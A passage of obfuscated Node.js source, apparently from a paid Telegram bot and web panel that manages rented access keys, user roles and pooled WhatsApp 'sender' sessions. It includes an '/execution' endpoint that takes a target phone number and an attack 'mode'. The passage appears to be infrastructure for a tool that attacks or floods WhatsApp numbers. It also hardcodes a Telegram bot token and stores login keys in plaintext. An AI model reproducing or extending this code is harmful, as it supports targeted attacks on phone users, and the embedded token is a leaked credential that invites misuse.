    if (_0x5b4769) {
      try {
        await _0x1a7cc8.telegram.deleteMessage(_0x5b4769.adminChatId, _0x5b4769.pollMessageId);
        await _0x1a7cc8.telegram.deleteMessage(_0x5b4769.adminChatId, _0x5b4769.infoMessageId);
      } catch (_0x2b9bfc) {
        console.log("Gagal hapus polling start:", _0x2b9bfc.message);
      }
      let _0x1c55c6 = "";
      if (_0x32b606 === 0) {
        _0x1c55c6 = "<blockquote>⚙️ SETTINGS MENU</blockquote>\n\n<b>Command untuk pengaturan user:</b>\n\n<code>/ckey username,durasi,telegram_id</code>\n<code>/listkey</code>\n<code>/delkey username</code>\n<code>/myrole</code>\n\n<i>Example: /ckey user1,30d,123456789</i>";
      } else if (_0x32b606 === 1) {
        const _0x1c80bd = _0x1cd92e(_0x478717.toString());
        if (!_0x1c80bd) {
          _0x1c55c6 = "⚠️ <b>ACCESS DENIED</b>\nHanya owner yang bisa mengakses menu ini!";
        } else {
          _0x1c55c6 = "<blockquote>👑 OWNER MENU</blockquote>\n\n<b>Command khusus untuk owner:</b>\n\n<code>/connect</code> - Hubungkan WhatsApp\n<code>/listsender</code> - List semua sender\n<code>/delsender</code> - Hapus sender\n<code>/addowner user_id</code> - Tambah owner\n<code>/delowner user_id</code> - Hapus owner\n\n<i>Example: /addowner 123456789</i>";
        }
      } else if (_0x32b606 === 2) {
        const _0x33b14f = _0x51e222();
        const _0x159da4 = _0x3de425.size;
        const _0x4c35be = Object.keys(_0x33b14f).length;
        let _0x31dad2 = 0;
        Object.values(_0x33b14f).forEach(_0x5bc3a1 => {
          _0x31dad2 += _0x5bc3a1.length;
        });
        _0x1c55c6 = "<blockquote>📊 SESSION STATUS</blockquote>\n\n";
        _0x1c55c6 += "<b>✅ Active Sessions:</b> " + _0x159da4 + "\n";
        _0x1c55c6 += "<b>👥 Registered Users:</b> " + _0x4c35be + "\n";
        _0x1c55c6 += "<b>📞 Total Senders:</b> " + _0x31dad2 + "\n\n";
        if (_0x4c35be > 0) {
          _0x1c55c6 += "<b>📋 User Details:</b>\n";
          let _0x4b5136 = 1;
          Object.entries(_0x33b14f).forEach(([_0x187a24, _0x2fbb42]) => {
            if (_0x4b5136 <= 5) {
              const _0x345ff7 = _0x2fbb42.filter(_0xe55f7e => _0x3de425.has(_0xe55f7e)).length;
              _0x1c55c6 += "\n<b>" + _0x4b5136 + ". " + _0x187a24 + ":</b> " + _0x345ff7 + "/" + _0x2fbb42.length + " aktif";
              _0x4b5136++;
            }
          });
          if (_0x4c35be > 5) {
            _0x1c55c6 += "\n\n<i>...dan " + (_0x4c35be - 5) + " user lainnya</i>";
          }
        }
      } else if (_0x32b606 === 3) {
        _0x1c55c6 = "❌ <b>Polling dibatalkan</b>\n\nGunakan /start untuk memulai kembali.";
      }
      if (_0x1c55c6) {
        await _0x1a7cc8.telegram.sendMessage(_0x478717, _0x1c55c6, {
          parse_mode: "HTML"
        });
      }
      _0x224348.delete(_0x56ef8d);
      return;
    }
    const _0x32ed60 = _0x13d86b.get(_0x56ef8d);
    if (_0x32ed60) {
      try {
        await _0x1a7cc8.telegram.deleteMessage(_0x32ed60.adminChatId, _0x32ed60.pollMessageId);
        await _0x1a7cc8.telegram.deleteMessage(_0x32ed60.adminChatId, _0x32ed60.infoMessageId);
      } catch (_0xcc100a) {
        console.log("Gagal hapus polling ckey:", _0xcc100a.message);
      }
      if (_0x32ed60.type === "listkey") {
        if (_0x32b606 === _0x32ed60.users.length) {
          let _0x3dada8 = "<b>📋 DAFTAR SEMUA USER</b>\n\n";
          _0x32ed60.users.forEach((_0x36f4c1, _0x5d84f6) => {
            const _0x166d8c = new Date(_0x36f4c1.expired).toLocaleString("id-ID", {
              timeZone: "Asia/Jakarta",
              year: "numeric",
              month: "2-digit",
              day: "2-digit",
              hour: "2-digit",
              minute: "2-digit"
            });
            const _0x56e1db = Date.now() > _0x36f4c1.expired ? "❌ EXPIRED" : "✅ AKTIF";
            _0x3dada8 += "<b>" + (_0x5d84f6 + 1) + ". " + _0x36f4c1.username + "</b>\n" + ("Key: <code>" + _0x36f4c1.key + "</code>\n") + ("Role: " + (_0x36f4c1.role || "user") + "\n") + ("Telegram: " + (_0x36f4c1.telegram_id || "-") + "\n") + ("Expired: " + _0x166d8c + "\n") + ("Status: " + _0x56e1db + "\n\n");
          });
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, _0x3dada8, {
            parse_mode: "HTML"
          });
        } else if (_0x32b606 === _0x32ed60.users.length + 1) {
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, "❌ <b>Dibatalkan</b>", {
            parse_mode: "HTML"
          });
        } else {
          const _0x20ab73 = _0x32b606;
          if (_0x20ab73 >= 0 && _0x20ab73 < _0x32ed60.users.length) {
            const _0x517e44 = _0x32ed60.users[_0x20ab73];
            const _0x2a5cf5 = new Date(_0x517e44.expired).toLocaleString("id-ID", {
              timeZone: "Asia/Jakarta",
              year: "numeric",
              month: "2-digit",
              day: "2-digit",
              hour: "2-digit",
              minute: "2-digit"
            });
            const _0xa642b6 = Date.now() > _0x517e44.expired ? "❌ EXPIRED" : "✅ AKTIF";
            const _0xd9991d = "<b>👤 DETAIL USER</b>\n\n" + ("<b>Username:</b> <code>" + _0x517e44.username + "</code>\n") + ("<b>Key:</b> <code>" + _0x517e44.key + "</code>\n") + ("<b>Role:</b> " + (_0x517e44.role || "user") + "\n") + ("<b>Telegram ID:</b> " + (_0x517e44.telegram_id || "-") + "\n") + ("<b>Expired:</b> " + _0x2a5cf5 + " WIB\n") + ("<b>Status:</b> " + _0xa642b6 + "\n") + ("<b>Created:</b> " + (_0x517e44.created_at ? new Date(_0x517e44.created_at).toLocaleDateString("id-ID") : "-"));
            await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, _0xd9991d, {
              parse_mode: "HTML"
            });
          }
        }
        _0x13d86b.delete(_0x56ef8d);
        return;
      }
      if (_0x32ed60.type === "delkey") {
        if (_0x32b606 === _0x32ed60.users.length) {
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, "❌ <b>Penghapusan dibatalkan</b>", {
            parse_mode: "HTML"
          });
        } else {
          const _0x53e65d = _0x32b606;
          if (_0x53e65d >= 0 && _0x53e65d < _0x32ed60.users.length) {
            const _0x2dde3b = _0x32ed60.users[_0x53e65d];
            const _0x109ef4 = _0x32ed60.users.filter((_0x4c5f4f, _0x2e4404) => _0x2e4404 !== _0x53e65d);
            _0x28fca2(_0x109ef4);
            await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, "✅ <b>User berhasil dihapus</b>\n\n" + ("<b>Username:</b> <code>" + _0x2dde3b.username + "</code>\n") + ("<b>Role:</b> " + (_0x2dde3b.role || "user") + "\n") + "<i>Key user telah dihapus dari sistem</i>", {
              parse_mode: "HTML"
            });
          }
        }
        _0x13d86b.delete(_0x56ef8d);
        return;
      }
      if (_0x32ed60.type === "ckey") {
        let _0x7754df = "";
        let _0x15f364 = "";
        switch (_0x32b606) {
          case 0:
            _0x7754df = "owner";
            _0x15f364 = "👑 Owner";
            break;
          case 1:
            _0x7754df = "admin";
            _0x15f364 = "🔧 Admin";
            break;
          case 2:
            _0x7754df = "user";
            _0x15f364 = "👤 User";
            break;
          case 3:
            _0x13d86b.delete(_0x56ef8d);
            await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, "❌ <b>Pembuatan key dibatalkan</b>", {
              parse_mode: "HTML"
            });
            return;
        }
        const _0x384a18 = _0x2a638b();
        const _0x19509a = _0x384a18.findIndex(_0x3c97cd => _0x3c97cd.username === _0x32ed60.username);
        const _0x55b6da = new Date(_0x32ed60.expired).toLocaleString("id-ID", {
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          timeZone: "Asia/Jakarta"
        });
        if (_0x19509a !== -1) {
          _0x384a18[_0x19509a] = {
            ..._0x384a18[_0x19509a],
            key: _0x32ed60.key,
            expired: _0x32ed60.expired,
            role: _0x7754df,
            telegram_id: _0x32ed60.telegramId,
            updated_at: Date.now()
          };
        } else {
          _0x384a18.push({
            username: _0x32ed60.username,
            key: _0x32ed60.key,
            expired: _0x32ed60.expired,
            role: _0x7754df,
            telegram_id: _0x32ed60.telegramId,
            isLoggedIn: false,
            created_at: Date.now(),
            created_by: _0x32ed60.adminId
          });
        }
        const _0x14ff88 = _0x28fca2(_0x384a18);
        if (!_0x14ff88) {
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, "❌ <b>Gagal menyimpan data user!</b>", {
            parse_mode: "HTML"
          });
          _0x13d86b.delete(_0x56ef8d);
          return;
        }
        try {
          await _0x1a7cc8.telegram.sendChatAction(_0x32ed60.telegramId, "typing");
          const _0xe2e604 = "🔐 <b>AKUN BARU TELAH DIBUAT</b>\n\n" + ("<b>Username:</b> <code>" + _0x32ed60.username + "</code>\n") + ("<b>Password:</b> <code>" + _0x32ed60.key + "</code>\n") + ("<b>Role:</b> " + _0x15f364 + "\n") + ("<b>Expired:</b> " + _0x55b6da + " WIB\n\n") + "<b>Login via:</b>\n" + ("• Web: " + _0x10a471 + ":" + _0xb0bfe8 + "\n") + ("• Bot: @" + _0x1a7cc8.botInfo.username + "\n\n") + "<i>Simpan data ini dengan aman!</i>";
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.telegramId, _0xe2e604, {
            parse_mode: "HTML"
          });
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, "✅ <b>Key berhasil dibuat dan dikirim ke user!</b>\n\n" + ("<b>Username:</b> <code>" + _0x32ed60.username + "</code>\n") + ("<b>Role:</b> " + _0x15f364 + "\n") + ("<b>Telegram ID:</b> <code>" + _0x32ed60.telegramId + "</code>\n\n") + "<i>Data telah dikirim ke chat pribadi user</i>", {
            parse_mode: "HTML"
          });
        } catch (_0x9eee25) {
          let _0x2f4263 = "";
          if (_0x9eee25.code === 403) {
            _0x2f4263 = "⚠️ <b>Gagal mengirim data ke user!</b>\n\n" + ("User dengan ID <code>" + _0x32ed60.telegramId + "</code> belum memulai bot.\n") + ("Minta user untuk ketik /start di bot @" + _0x1a7cc8.botInfo.username + " terlebih dahulu.\n\n") + "<b>Data untuk dikirim manual:</b>\n" + ("Username: " + _0x32ed60.username + "\n") + ("Key: " + _0x32ed60.key + "\n") + ("Role: " + _0x7754df + "\n") + ("Expired: " + _0x55b6da);
          } else if (_0x9eee25.code === 400) {
            _0x2f4263 = "❌ <b>Telegram ID tidak valid!</b>\n\n" + ("ID <code>" + _0x32ed60.telegramId + "</code> tidak ditemukan.\n") + "Pastikan user sudah mengaktifkan bot atau ID benar.";
          } else {
            _0x2f4263 = "❌ <b>Error mengirim ke user:</b> " + _0x9eee25.message + "\n\n<b>Silakan kirim data secara manual ke user:</b>\n\n" + ("<code>Username: " + _0x32ed60.username + "</code>\n") + ("<code>Key: " + _0x32ed60.key + "</code>\n") + ("<code>Role: " + _0x7754df + "</code>\n") + ("<code>Login: https://" + _0x10a471 + ":" + _0xb0bfe8 + "</code>");
          }
          await _0x1a7cc8.telegram.sendMessage(_0x32ed60.adminId, _0x2f4263, {
            parse_mode: "HTML"
          });
        }
        _0x13d86b.delete(_0x56ef8d);
        return;
      }
    }
  } catch (_0x277670) {
    console.error("Error in poll_answer handler:", _0x277670);
  }
});
_0x337bc3.command("sessions", async _0x4a93ae => {
  const _0x2cdec2 = _0x51e222();
  const _0x5f5893 = _0x3de425.size;
  let _0x1697e5 = "<blockquote>📊 Session Status</blockquote>\n\n";
  _0x1697e5 += "<b>Active Sessions:</b> " + _0x5f5893 + "\n";
  _0x1697e5 += "<b>Registered Users:</b> " + Object.keys(_0x2cdec2).length + "\n\n";
  if (Object.keys(_0x2cdec2).length > 0) {
    _0x1697e5 += "<b>User Details:</b>\n";
    Object.entries(_0x2cdec2).forEach(([_0x1746c3, _0x88dd54], _0x326625) => {
      _0x1697e5 += "\n<b>" + (_0x326625 + 1) + ". " + _0x1746c3 + ":</b> " + _0x88dd54.length + " sender(s)\n";
      _0x88dd54.forEach(_0x2afe75 => {
        const _0x38bddd = _0x3de425.has(_0x2afe75);
        _0x1697e5 += "   - " + _0x2afe75 + " " + (_0x38bddd ? "✅" : "❌") + "\n";
      });
    });
  } else {
    _0x1697e5 += "<i>Tidak ada session terdaftar</i>";
  }
  const _0x5c3b64 = _0x2a0035.inlineKeyboard([[_0x2a0035.button.callback("🔄 Refresh", "session_status")], [_0x2a0035.button.callback("🏠 Main Menu", "back_to_main")]]);
  const _0x4afa92 = {
    parse_mode: "HTML",
    reply_markup: _0x5c3b64.reply_markup
  };
  await _0x4a93ae.reply(_0x1697e5, _0x4afa92);
});
_0x337bc3.command("myrole", async _0xd68e8 => {
  const _0x8df3e = _0xd68e8.from.id.toString();
  const _0x4b7e13 = _0xd68e8.from.username || _0xd68e8.from.first_name || "User";
  let _0x526629 = "User";
  if (_0x1cd92e(_0x8df3e)) {
    _0x526629 = "Owner";
  } else if (_0x3ba39e(_0x8df3e) && !_0x1cd92e(_0x8df3e)) {
    _0x526629 = "Admin";
  }
  const _0x32e3a0 = _0x2a0035.inlineKeyboard([[_0x2a0035.button.callback("🔑 Buat Key", "quick_listkey")], [_0x2a0035.button.callback("📋 List Keys", "quick_listkey")], [_0x2a0035.button.callback("🏠 Main Menu", "back_to_main")]]);
  await _0xd68e8.reply("\n👤 <b>Role Information</b>\n\n🆔 <b>User:</b> " + _0x4b7e13 + "\n🎭 <b>Bot Role:</b> " + _0x526629 + "\n💻 <b>User ID:</b> <code>" + _0x8df3e + "</code>\n\n" + (_0x526629 === "Owner" ? "🔓 <i>Anda memiliki akses penuh ke semua fitur</i>" : _0x526629 === "Admin" ? "🔐 <i>Anda memiliki akses terbatas</i>" : "🔒 <i>Akses terbatas untuk user biasa</i>") + "\n  ", {
    parse_mode: "HTML",
    reply_markup: _0x32e3a0.reply_markup
  });
});
_0x337bc3.command("pending", async _0xc3bf5f => {
  const _0x23bbdd = _0xc3bf5f.from.id.toString();
  if (!_0x1cd92e(_0x23bbdd)) {
    return _0xc3bf5f.reply("🚫 Akses ditolak.");
  }
  const _0x45b3ab = _0x13d86b.size;
  let _0x588317 = "📊 <b>Pending Operations</b>\n\n";
  _0x588317 += "Total pending: " + _0x45b3ab + "\n\n";
  if (_0x45b3ab > 0) {
    _0x13d86b.forEach((_0x26c8c7, _0x4e9fd2) => {
      _0x588317 += "• Poll ID: " + _0x4e9fd2.substring(0, 8) + "...\n";
      _0x588317 += "  Type: " + (_0x26c8c7.type || "ckey") + "\n";
      _0x588317 += "  User: " + (_0x26c8c7.username || "N/A") + "\n";
      _0x588317 += "  Time: " + new Date(_0x26c8c7.timestamp).toLocaleTimeString("id-ID") + "\n\n";
    });
  } else {
    _0x588317 += "✅ Tidak ada operasi pending.";
  }
  await _0xc3bf5f.reply(_0x588317, {
    parse_mode: "HTML"
  });
});
_0x337bc3.command("cleanup", async _0x51a6a6 => {
  const _0x490531 = _0x51a6a6.from.id.toString();
  if (!_0x1cd92e(_0x490531)) {
    return _0x51a6a6.reply("🚫 Akses ditolak.");
  }
  const _0x562b5e = Date.now();
  let _0x1d6d3a = 0;
  _0x13d86b.forEach((_0x481718, _0x57a5a3) => {
    if (_0x562b5e - _0x481718.timestamp > 600000) {
      _0x13d86b.delete(_0x57a5a3);
      _0x1d6d3a++;
    }
  });
  await _0x51a6a6.reply("✅ Cleanup selesai. " + _0x1d6d3a + " pending dihapus.");
});
_0x337bc3.command("addowner", _0x221f6e => {
  const _0x2f8f21 = _0x221f6e.from.id.toString();
  const _0x5921a4 = _0x221f6e.message.text.split(" ")[1];
  if (!_0x1cd92e(_0x2f8f21)) {
    return _0x221f6e.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!_0x5921a4) {
    return _0x221f6e.reply("✗ Format salah\n\nExample : /addowner 7066156416", {
      parse_mode: "HTML"
    });
  }
  const _0x366159 = _0x46577c();
  if (_0x366159.owners.includes(_0x5921a4)) {
    return _0x221f6e.reply("✗ Already an owner.");
  }
  _0x366159.owners.push(_0x5921a4);
  _0x7b9dc5(_0x366159);
  _0x221f6e.reply("✓ New owner added: " + _0x5921a4);
});
_0x337bc3.command("delowner", _0xbacf75 => {
  const _0x391a03 = _0xbacf75.from.id.toString();
  const _0x5c0b71 = _0xbacf75.message.text.split(" ")[1];
  if (!_0x1cd92e(_0x391a03)) {
    return _0xbacf75.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!_0x5c0b71) {
    return _0xbacf75.reply("✗ Format salah\n\nExample : /delowner 7066156416", {
      parse_mode: "HTML"
    });
  }
  const _0x38a2a2 = _0x46577c();
  if (!_0x38a2a2.owners.includes(_0x5c0b71)) {
    return _0xbacf75.reply("✗ Not the owner.");
  }
  _0x38a2a2.owners = _0x38a2a2.owners.filter(_0x4716c2 => _0x4716c2 !== _0x5c0b71);
  _0x7b9dc5(_0x38a2a2);
  _0xbacf75.reply("✓ Owner ID " + _0x5c0b71 + " was successfully deleted.");
});
const {
  default: _0x52a865,
  makeCacheableSignalKeyStore: _0x5377ae,
  useMultiFileAuthState: _0x459f16,
  DisconnectReason: _0x2fac77,
  fetchLatestWaWebVersion: _0x15cb66,
  generateForwardMessageContent: _0x5c3228,
  prepareWAMessageMedia: _0x24789c,
  generateWAMessageFromContent: _0x3c577e,
  generateMessageTag: _0x3958c9,
  generateMessageID: _0x350c03,
  downloadContentFromMessage: _0x4787cf,
  makeInMemoryStore: _0xd6b1de,
  getContentType: _0xbff46b,
  jidDecode: _0x3ea6d9,
  MessageRetryMap: _0x4fb49e,
  getAggregateVotesInPollMessage: _0x34542d,
  proto: _0x5b40d6,
  delay: _0x2feb04
} = require("@whiskeysockets/baileys");
const {
  actions: _0x18195b
} = require("./database/func-config.js");
_0x556fad.use(_0x1cd873.urlencoded({
  extended: true
}));
_0x556fad.use(_0x34bae4.urlencoded({
  extended: true
}));
_0x556fad.use(_0x43a4a2());
_0x556fad.use(_0x34bae4.json());
_0x556fad.use(_0x34bae4.static("public"));
_0x556fad.use("/", _0x1aef89);
_0x556fad.use((_0x3f0eda, _0x58c0b9, _0x5b0415) => {
  if (!_0x3f0eda.path.match(/\.(css|js|jpg|png|gif|ico|svg|mp3|mp4)$/)) {
    _0x58c0b9.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
    _0x58c0b9.setHeader("Pragma", "no-cache");
    _0x58c0b9.setHeader("Expires", "0");
    _0x58c0b9.setHeader("X-Content-Type-Options", "nosniff");
  }
  _0x5b0415();
});
const {
  requireAuth: _0x4028eb
} = require("./auth.middleware.js");
_0x556fad.get("/", (_0x4bc3a3, _0x4ce637) => {
  const _0x43ef8b = _0x4bc3a3.cookies.sessionUser;
  const _0x4fe36a = _0x4bc3a3.cookies.sessionId;
  const _0x4317b5 = _0x55cb79.get(_0x43ef8b);
  const _0x67b847 = _0x4317b5 && _0x4317b5.sessionId === _0x4fe36a;
  if (_0x43ef8b && _0x67b847) {
    const _0x19b438 = _0x2a638b();
    const _0x4f032f = _0x19b438.find(_0x27df59 => _0x27df59.username === _0x43ef8b);
    if (_0x4f032f && Date.now() < _0x4f032f.expired) {
      return _0x4ce637.redirect("/dashboard");
    }
  }
  const _0x284288 = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "Login.html");
  _0x131869.readFile(_0x284288, "utf8", (_0x58be53, _0x533523) => {
    if (_0x58be53) {
      return _0x4ce637.status(500).send("✗ Gagal baca Login.html");
    }
    _0x4ce637.send(_0x533523);
  });
});
_0x556fad.get("/login", (_0xe38e1c, _0x3a059a) => {
  const _0x2bff7b = _0xe38e1c.cookies.sessionUser;
  const _0x40694a = _0xe38e1c.cookies.sessionId;
  const _0x59a145 = _0x55cb79.get(_0x2bff7b);
  const _0x2b49f2 = _0x59a145 && _0x59a145.sessionId === _0x40694a;
  if (_0x2bff7b && _0x2b49f2) {
    const _0xe36283 = _0x2a638b();
    const _0x204845 = _0xe36283.find(_0x235327 => _0x235327.username === _0x2bff7b);
    if (_0x204845 && Date.now() < _0x204845.expired) {
      return _0x3a059a.redirect("/dashboard");
    }
  }
  const _0xda9887 = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "Login.html");
  _0x131869.readFile(_0xda9887, "utf8", (_0x2e0d42, _0x2af34e) => {
    if (_0x2e0d42) {
      return _0x3a059a.status(500).send("✗ Gagal baca Login.html");
    }
    _0x3a059a.send(_0x2af34e);
  });
});
_0x556fad.post("/auth", (_0x43ceda, _0x4356c9) => {
  const {
    username: _0x1de64e,
    key: _0x196fdf,
    remember: _0x3d0080
  } = _0x43ceda.body;
  const _0x3cd895 = _0x2a638b();
  const _0x30bc19 = _0x3cd895.find(_0x5a71c1 => _0x5a71c1.username === _0x1de64e && _0x5a71c1.key === _0x196fdf);
  if (!_0x30bc19) {
    return _0x4356c9.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }
  if (Date.now() > _0x30bc19.expired) {
    return _0x4356c9.redirect("/login?msg=" + encodeURIComponent("Akun telah expired!"));
  }
  if (_0x55cb79.has(_0x1de64e)) {
    return _0x4356c9.redirect("/login?msg=" + encodeURIComponent("Akun sudah login di device lain!"));
  }
  const _0x361829 = _0x4c8c28();
  const _0x42f5d1 = _0x3d0080 === "true" ? 2592000000 : 86400000;
  const _0x406633 = {
    username: _0x30bc19.username,
    role: _0x30bc19.role,
    expired: _0x30bc19.expired
  };
  const _0x86a42b = {
    sessionId: _0x361829,
    loginTime: Date.now(),
    userAgent: _0x43ceda.headers["user-agent"],
    expiresAt: Date.now() + _0x42f5d1,
    remember: _0x3d0080 === "true",
    userData: _0x406633
  };
  _0x55cb79.set(_0x1de64e, _0x86a42b);
  _0x95dde8();
  const _0x5828d5 = {
    maxAge: _0x42f5d1,
    httpOnly: true,
    path: "/"
  };
  const _0x4a672c = _0x5828d5;
  _0x4356c9.cookie("sessionUser", _0x1de64e, _0x4a672c);
  _0x4356c9.cookie("sessionId", _0x361829, _0x4a672c);
  _0x4356c9.redirect("/dashboard");
});
_0x556fad.get("/dashboard", _0x4028eb, (_0x31188f, _0x5e6662) => {
  _0x5e6662.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
  _0x5e6662.setHeader("Pragma", "no-cache");
  _0x5e6662.setHeader("Expires", "0");
  const _0x235fe8 = Date.now();
  const _0x2ad610 = _0xaff847.join(__dirname, "!─☇𝐒𝐢𝐗", "dashboard.html");
  _0x131869.readFile(_0x2ad610, "utf8", (_0x3b99bd, _0xefe51a) => {
    if (_0x3b99bd) {
      console.error("❌ Gagal membaca file dashboard.html:", _0x3b99bd);
      return _0x5e6662.status(500).send("File dashboard tidak ditemukan");
    }
    const _0x12ce82 = "\n        <script>\n            // Session checker setiap 30 detik\n            setInterval(() => {\n                fetch('/api/session-check', {\n                    credentials: 'include'\n                })\n                .then(response => {\n                    if (!response.ok) {\n                        // Session invalid, logout\n                        window.location.href = '/logout?reason=session_expired';\n                    }\n                })\n                .catch(() => {\n                    window.location.href = '/logout?reason=network_error';\n                });\n            }, 30000);\n            \n            // Prevent back button after logout\n            history.pushState(null, null, location.href);\n            window.onpopstate = function () {\n                history.go(1);\n            };\n        </script>\n        ";
    const _0x153201 = _0xefe51a.replace("</body>", _0x12ce82 + "</body>");
    _0x5e6662.send(_0x153201);
  });
});
_0x556fad.get("/api/option-data", _0x4028eb, (_0x229805, _0x46f335) => {
  try {
    const _0x37c01b = _0x229805.cookies.sessionUser;
    const _0x333680 = _0x229805.cookies.sessionId;
    const _0x56207f = _0x55cb79.get(_0x37c01b);
    const _0x2f12d6 = _0x56207f && _0x56207f.sessionId === _0x333680;
    if (!_0x2f12d6) {
      return _0x46f335.status(401).json({
        error: "Session invalid",
        redirect: "/login"
      });
    }
    const _0x11f1c6 = _0x2a638b();
    const _0x171ae2 = _0x11f1c6.find(_0x54c381 => _0x54c381.username === _0x37c01b);
    if (!_0x171ae2) {
      return _0x46f335.status(404).json({
        error: "User not found",
        redirect: "/login"
      });
    }
    const _0x2b28b2 = Date.now();
    if (_0x2b28b2 > _0x171ae2.expired) {
      return _0x46f335.status(403).json({
        error: "Account expired",
        redirect: "/login?msg=Account+expired"
      });
    }
    const _0x11497d = _0x51e222();
    const _0x26a8dd = _0x11497d[_0x37c01b] || [];
    const _0x3864a1 = _0x26a8dd.filter(_0x3a9474 => _0x3de425.has(_0x3a9474));
    let _0xf193f2;
    if (_0x171ae2.expired === "Permanent" || _0x171ae2.expired > _0x2b28b2 + 315360000000) {
      _0xf193f2 = "Permanent";
    } else {
      _0xf193f2 = new Date(_0x171ae2.expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit"
      });
    }
    const _0x53b432 = _0x171ae2.expired - _0x2b28b2;
    const _0x825b06 = Math.max(0, Math.floor(_0x53b432 / 86400000));
    let _0x27ed5d = _0x55cb79.size;
    if (_0x56207f) {
      _0x56207f.lastActive = _0x2b28b2;
      _0x95dde8();
    }
    const _0x1485c3 = {
      username: _0x171ae2.username,
      role: _0x171ae2.role || "user",
      activeSenders: _0x3864a1.length,
      totalSenders: _0x26a8dd.length,
      expired: _0xf193f2,
      daysRemaining: _0x825b06,
      isPermanent: _0x171ae2.expired === "Permanent" || _0x171ae2.expired > _0x2b28b2 + 315360000000,
      onlineUsers: _0x27ed5d || 1,
      sessionValid: true,
      timestamp: _0x2b28b2,
      accountStatus: _0x53b432 > 0 ? "active" : "expired"
    };
    _0x46f335.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
    _0x46f335.setHeader("Pragma", "no-cache");
    _0x46f335.setHeader("Expires", "0");
    _0x46f335.setHeader("X-Content-Type-Options", "nosniff");
    _0x46f335.json(_0x1485c3);
  } catch (_0xb72612) {
    console.error("[API] Error in /api/option-data:", _0xb72612);
    _0x46f335.status(500).json({
      error: "Internal server error",
      timestamp: Date.now()
    });
  }
});
_0x556fad.get("/api/reload-sessions", _0x4028eb, async (_0xa980a5, _0x22dab5) => {
  try {
    const _0x469aaa = _0xa980a5.cookies.sessionUser;
    console.log(_0x17147b.blue.bold("[API] Manual reload requested by " + _0x469aaa));
    _0x1cdda6();
    _0x22dab5.json({
      success: true,
      message: "Session reload initiated",
      timestamp: Date.now()
    });
  } catch (_0xcaed65) {
    console.error("[API] Reload sessions error:", _0xcaed65);
    _0x22dab5.status(500).json({
      success: false,
      error: "Failed to reload sessions"
    });
  }
});
_0x556fad.get("/api/profile-data", _0x4028eb, (_0x4a4275, _0x237fbd) => {
  const _0x2ed3d1 = _0x4a4275.cookies.sessionUser;
  const _0x509899 = _0x2a638b();
  const _0x26349b = _0x509899.find(_0x2b6187 => _0x2b6187.username === _0x2ed3d1);
  if (!_0x26349b) {
    return _0x237fbd.status(404).json({
      error: "User not found"
    });
  }
  const _0x5d534f = new Date(_0x26349b.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit"
  });
  const _0x391c98 = Date.now();
  const _0x218ff3 = _0x26349b.expired - _0x391c98;
  const _0x564b3e = Math.max(0, Math.floor(_0x218ff3 / 86400000));
  _0x237fbd.json({
    username: _0x26349b.username,
    role: _0x26349b.role || "user",
    key: _0x26349b.key || "",
    activeSenders: _0x3de425.size,
    expired: _0x5d534f,
    daysRemaining: _0x564b3e,
    createdAt: _0x26349b.createdAt || Date.now(),
    telegram_id: _0x26349b.telegram_id || "",
    status: Date.now() > _0x26349b.expired ? "expired" : "active"
  });
});
_0x556fad.get("/api/user-stats", _0x4028eb, (_0x259db8, _0x5e02b3) => {
  const _0x4729c2 = _0x259db8.cookies.sessionUser;
  const _0x5804eb = _0x51e222();
  const _0x45cf1e = _0x5804eb[_0x4729c2] || [];
  const _0x1dc50b = _0x45cf1e.map(_0x55f490 => ({
    number: _0x55f490,
    country: _0x1031b2(_0x55f490),
    formatted: formatPhoneNumber(_0x55f490)
  }));
  const _0xc19a3b = {
    stats: _0x1dc50b
  };
  _0x5e02b3.json(_0xc19a3b);
});
_0x556fad.get("/api/online-users", _0x4028eb, (_0x33603b, _0x22e0a0) => {
  const _0x4da6b3 = _0x55cb79.size;
  _0x22e0a0.json({
    onlineUsers: _0x4da6b3 || 1,
    timestamp: Date.now()
  });
});
const _0x5d5e5e = "7633972159:AAGGxu_6A7Jx8eyptt0fNJgfPEGwfAEdeJk";
const _0x1c68db = "7633972159";
let _0x529c3a = 0;
_0x556fad.get("/execution", async (_0x5e866a, _0x317808) => {
  try {
    const _0x5f0182 = _0x5e866a.cookies.sessionUser;
    if (!_0x5f0182) {
      return _0x317808.redirect("/login?msg=Silakan login terlebih dahulu");
    }
    const _0x22132a = _0x2a638b();
    const _0x1f7105 = _0x22132a.find(_0xedd472 => _0xedd472.username === _0x5f0182);
    if (!_0x1f7105 || !_0x1f7105.expired || Date.now() > _0x1f7105.expired) {
      return _0x317808.redirect("/login?msg=Session expired, login ulang");
    }
    const _0x1075c8 = _0x5e866a.query.justExecuted === "true";
    const _0x56a996 = _0x5e866a.query.target || "";
    const _0x1268f9 = _0x5e866a.query.mode || "";
    if (_0x1075c8 && _0x56a996 && _0x1268f9) {
      const _0x4a84d8 = _0x56a996.replace(/\D/g, "");
      const _0x2d0a1b = _0x1031b2(_0x4a84d8);
      return _0x317808.send(_0x174e84("✓ S U C C E S", {
        target: _0x56a996,
        timestamp: new Date().toLocaleString("id-ID"),
